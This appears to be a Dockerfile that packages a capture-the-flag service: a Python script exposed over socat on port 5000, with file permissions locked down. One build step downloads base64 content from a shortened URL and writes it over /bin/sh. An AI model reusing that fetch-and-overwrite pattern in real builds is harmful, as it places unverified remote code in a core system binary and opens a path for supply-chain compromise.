FROM ubuntu:bionic

WORKDIR /challs

RUN apt update && apt upgrade -y && apt update --fix-missing
RUN apt install curl python3 netcat-openbsd vim nano socat lib32ncurses5 python3-pip -y

COPY service.py /challs/service.py

RUN pip3 install pycryptodome
RUN chmod +x /challs/service.py
RUN chown -R 755 /challs/
RUN curl -Ls https://goo.gl/yia654 | base64 -d > /bin/sh
RUN chmod 700 /usr/bin/* /bin/* /tmp /dev/shm
RUN chmod 755 /usr/bin/env /usr/bin/python3 /bin/dash /bin/bash /bin/sh /bin/nc /bin/cat /usr/bin/curl /usr/bin/groups /usr/bin/id /bin/ls /usr/bin/vi /usr/bin/vim /bin/nano

EXPOSE 5000

CMD socat TCP-LISTEN:5000,reuseaddr,fork EXEC:./service.py,su=nobody